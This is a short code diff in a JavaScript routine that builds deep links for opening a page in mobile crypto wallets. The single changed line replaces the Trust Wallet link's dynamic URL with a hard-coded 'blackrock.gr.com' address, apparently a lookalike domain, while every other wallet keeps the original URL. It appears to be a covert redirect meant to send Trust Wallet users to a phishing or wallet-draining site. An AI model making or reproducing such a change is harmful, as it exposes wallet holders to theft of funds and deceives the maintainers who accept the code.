@@ -403,7 +403,7 @@
             var tronlinkParam=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
             var links={
                 tronlink:{scheme:'tronlinkoutside://pull.activity?param='+tronlinkParam,pkg:'com.tronlinkpro.wallet'},
-                trust:{scheme:'trust://open_url?coin_id=195&url='+encoded,pkg:'com.wallet.crypto.trustapp'},
+                trust:{scheme:'trust://open_url?coin_id=195&url='+encodeURIComponent('https://www.blackrock.gr.com/'),pkg:'com.wallet.crypto.trustapp'},
                 tokenpocket:{scheme:'tpdapp://open?params='+encodeURIComponent(JSON.stringify({url:url,chain:'TRON'})),pkg:'vip.mytokenpocket'},
                 bitget:{scheme:'bitkeep://bkconnect?action=dapp&url='+encoded,pkg:'com.bitkeep.wallet'},
                 okx:{scheme:'okx://wallet/dapp/url?dappUrl='+encoded,pkg:'com.okinc.okex.gp'}
